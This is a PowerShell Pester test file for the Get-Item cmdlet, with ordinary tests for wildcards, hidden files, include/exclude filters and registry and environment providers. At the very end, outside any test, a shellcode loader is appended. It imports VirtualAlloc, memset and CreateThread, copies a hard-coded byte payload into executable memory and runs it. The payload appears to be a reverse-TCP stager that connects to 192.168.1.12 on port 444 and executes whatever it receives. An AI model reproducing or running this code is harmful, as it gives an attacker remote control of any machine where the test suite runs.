

Describe "Get-Item" -Tags "CI" {
    BeforeAll {
        if ( $IsWindows ) {
            $skipNotWindows = $false
        }
        else {
            $skipNotWindows = $true
        }
    }
    It "Should list all the items in the current working directory when asterisk is used" {
        $items = Get-Item (Join-Path -Path $PSScriptRoot -ChildPath "*")
        ,$items | Should -BeOfType 'System.Object[]'
    }

    It "Should return the name of the current working directory when a dot is used" {
        $item = Get-Item $PSScriptRoot
        $item | Should -BeOfType 'System.IO.DirectoryInfo'
        $item.Name | Should -BeExactly (Split-Path $PSScriptRoot -Leaf)
    }

    It "Should return the proper Name and BaseType for directory objects vs file system objects" {
        $rootitem = Get-Item $PSScriptRoot
        $rootitem | Should -BeOfType 'System.IO.DirectoryInfo'
        $childitem = (Get-Item (Join-Path -Path $PSScriptRoot -ChildPath Get-Item.Tests.ps1))
        $childitem | Should -BeOfType 'System.IO.FileInfo'
    }

    It "Using -literalpath should find no additional files" {
        $null = New-Item -type file "$TESTDRIVE/file[abc].txt"
        $null = New-Item -type file "$TESTDRIVE/filea.txt"
        
        $item = Get-Item -literalpath "$TESTDRIVE/file[abc].txt"
        @($item).Count | Should -Be 1
        $item.Name | Should -BeExactly 'file[abc].txt'
    }

    It "Should have mode flags set" {
        Get-ChildItem $PSScriptRoot | foreach-object { $_.Mode | Should -Not -BeNullOrEmpty }
    }

    It "Should not return the item unless force is used if hidden" {
        ${hiddenFile} = "${TESTDRIVE}/.hidden.txt"
        ${item} = New-Item -type file "${hiddenFile}"
        if ( ${IsWindows} ) {
            attrib +h "$hiddenFile"
        }
        ${result} = Get-Item "${hiddenFile}" -ErrorAction SilentlyContinue
        ${result} | Should -BeNullOrEmpty
        ${result} = Get-Item -force "${hiddenFile}" -ErrorAction SilentlyContinue
        ${result}.FullName | Should -BeExactly ${item}.FullName
    }

    It "Should get properties for special reparse points" -skip:$skipNotWindows {
        $result = Get-Item -Path $HOME/Cookies -Force
        $result.LinkType | Should -BeExactly "Junction"
        $result.Target | Should -Not -BeNullOrEmpty
        $result.Name | Should -BeExactly "Cookies"
        $result.Mode | Should -BeExactly "l--hs"
        $result.Exists | Should -BeTrue
    }

    It "Should return correct result for ToString() on root of drive" {
        $root = $IsWindows ? "${env:SystemDrive}\" : "/"
        (Get-Item -Path $root).ToString() | Should -BeExactly $root
    }

    Context "Test for Include, Exclude, and Filter" {
        BeforeAll {
            ${testBaseDir} = "${TESTDRIVE}/IncludeExclude"
            $null = New-Item -Type Directory "${testBaseDir}"
            $null = New-Item -Type File "${testBaseDir}/file1.txt"
            $null = New-Item -Type File "${testBaseDir}/file2.txt"
        }
        It "Should respect -Exclude" {
            $result = Get-Item "${testBaseDir}/*" -Exclude "file2.txt"
            ($result).Count | Should -Be 1
            $result.Name | Should -BeExactly "file1.txt"
        }
        It "Should respect -Include" {
            $result = Get-Item "${testBaseDir}/*" -Include "file2.txt"
            ($result).Count | Should -Be 1
            $result.Name | Should -BeExactly "file2.txt"
        }
        It "Should respect -Filter" {
            $result = Get-Item "${testBaseDir}/*" -Filter "*2*"
            ($result).Count | Should -Be 1
            $result.Name | Should -BeExactly "file2.txt"
        }
        It "Should respect combinations of filter, include, and exclude" {
            $result = get-item "${testBaseDir}/*" -filter *.txt -include "file[12].txt" -exclude file2.txt
            ($result).Count | Should -Be 1
            $result.Name | Should -BeExactly "file1.txt"
        }
    }

    Context "Error Condition Checking" {
        It "Should return an error if the provider does not exist" {
            { Get-Item BadProvider::/BadFile -ErrorAction Stop } | Should -Throw -ErrorId "ProviderNotFound,Microsoft.PowerShell.Commands.GetItemCommand"
        }

        It "Should return an error if the drive does not exist" {
            { Get-Item BadDrive:/BadFile -ErrorAction Stop } | Should -Throw -ErrorId "DriveNotFound,Microsoft.PowerShell.Commands.GetItemCommand"
        }
    }

    Context "Alternate Stream Tests" {
        BeforeAll {
            if ( $skipNotWindows )
            {
                return
            }
            $altStreamPath = "$TESTDRIVE/altStream.txt"
            $stringData = "test data"
            $streamName = "test"
            $item = new-item -type file $altStreamPath
            Set-Content -path $altStreamPath -Stream $streamName -Value $stringData
        }
        It "Should find an alternate stream if present" -skip:$skipNotWindows {
            $result = Get-Item $altStreamPath -Stream $streamName
            $result.Length | Should -Be ($stringData.Length + [Environment]::NewLine.Length)
            $result.Stream | Should -Be $streamName
        }
    }

    Context "Registry Provider" {
        It "Can retrieve an item from registry" -skip:$skipNotWindows {
            ${result} = Get-Item HKLM:/Software
            ${result} | Should -BeOfType "Microsoft.Win32.RegistryKey"
        }
    }

    Context "Environment provider" -tag "CI" {
        BeforeAll {
            $env:testvar="b"
            $env:testVar="a"
        }

        AfterAll {
            Clear-Item -Path env:testvar -ErrorAction SilentlyContinue
            Clear-Item -Path env:testVar -ErrorAction SilentlyContinue
        }

        It "get-item testVar" {
            (get-item env:\testVar).Value | Should -BeExactly "a"
        }

        It "get-item is case-sensitive/insensitive as appropriate" {
            $expectedValue = "b"
            if($IsWindows)
            {
                $expectedValue = "a"
            }

            (get-item env:\testvar).Value | Should -BeExactly $expectedValue
        }
    }
}

Describe "Get-Item environment provider on Windows with accidental case-variant duplicates" -Tags "Scenario" {
    BeforeAll {
        $env:testVar = 'a' 
    }
    AfterAll {
        $env:testVar = $null
    }
    It "Reports the effective value among accidental case-variant duplicates on Windows" -skip:$skipNotWindows {
        if (-not (Get-Command -ErrorAction Ignore node.exe)) {
            Write-Warning "Test skipped, because prerequisite Node.js is not installed."
        } else {
            $valDirect, $valGetItem, $unused = node.exe -pe @"
                env = {}
                env.testVar = process.env.testVar // include the original case variant with its original value.
                env.TESTVAR = 'b' // redefine with a case variant name and different value
                // Note: Which value will win is not deterministic(!); what matters, however, is that both
                //       $env:testvar and Get-Item env:testvar report the same value.
                //       The nondeterministic behavior makes it hard to prove that the values are *always* the
                //       same, however.
                require('child_process').execSync(\"\\\"$($PSHOME -replace '\\', '/')/pwsh.exe\\\" -noprofile -command `$env:testvar, (Get-Item env:testvar).Value\", { env: env }).toString()
"@
            $valGetItem | Should -BeExactly $valDirect
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0c,0x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

